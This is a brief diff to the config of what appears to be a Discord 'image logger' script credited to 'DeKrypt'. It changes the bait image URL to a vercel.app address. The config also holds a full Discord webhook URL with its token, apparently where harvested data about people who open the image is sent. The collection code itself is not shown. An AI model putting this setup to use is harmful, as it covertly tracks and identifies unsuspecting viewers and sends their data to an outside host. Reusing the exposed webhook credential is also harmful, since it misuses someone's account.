@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1538431177986146385/VdH8tnadTlfcEoAtUHGMLBgb3S8SDmekri5evTI4Axbb3VnKiZY9L-g7sdbnZ-Ssm28o",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTDUI0_1Dh2PlPaaHqrIaBFlSE6QT29DfKRz82F0-OCw&s=10", # You can also have a custom image by using a URL argument
+    "image": "https://imglogger-ashy.vercel.app/image.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
